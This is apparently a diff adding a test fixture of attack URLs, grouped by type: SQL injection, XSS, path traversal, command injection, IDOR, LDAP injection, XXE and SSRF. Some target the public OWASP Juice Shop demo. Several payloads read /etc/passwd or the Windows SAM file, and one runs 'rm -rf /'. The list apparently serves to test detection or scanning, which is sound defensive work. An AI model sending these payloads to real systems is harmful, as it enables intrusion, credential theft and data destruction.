@@ -1,0 +1,46 @@
+# Vulnerable Endpoints for Testing (Not in Training Dataset)
+
+# OWASP Juice Shop - Publicly Available Vulnerable Application
+https://juice-shop.herokuapp.com/rest/products/search?q=<script>alert('XSS')</script>
+https://juice-shop.herokuapp.com/rest/products/search?q=test' UNION SELECT * FROM users--
+https://juice-shop.herokuapp.com/api/products/1' OR '1'='1
+
+# Common SQL Injection Patterns
+https://example.com/api/users?id=1' OR '1'='1'--
+https://test.com/search?q=admin' UNION SELECT password FROM users--
+https://vulnerable.com/login?username=admin'--&password=anything
+
+# XSS Attack Patterns
+https://site.com/search?q=<script>alert(document.cookie)</script>
+https://web.com/page?name=<img src=x onerror=alert(1)>
+https://api.com/endpoint?input=<svg onload=alert('XSS')>
+
+# Path Traversal
+https://example.com/files/../../../etc/passwd
+https://site.com/download?file=..\..\windows\system32\config\sam
+
+# Command Injection
+https://api.com/exec?cmd=whoami
+https://site.com/api?command=cat /etc/passwd
+https://web.com/run?exec=rm -rf /
+
+# IDOR (Insecure Direct Object Reference)
+https://api.example.com/users/999999
+https://api.site.com/admin/delete?id=1
+https://web.com/api/privileged?action=escalate
+
+# Parameter Pollution
+https://api.com/data?id=1&id=2&id=3
+https://site.com/search?q=test&q=<script>alert(1)</script>
+
+# LDAP Injection
+https://example.com/search?user=*)(&(password=*))
+https://site.com/auth?username=admin)(&(password=*
+
+# XXE (XML External Entity)
+https://api.com/xml?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+
+# SSRF (Server-Side Request Forgery)
+https://api.com/fetch?url=http://internal-server/admin
+https://site.com/proxy?url=file:///etc/passwd
+
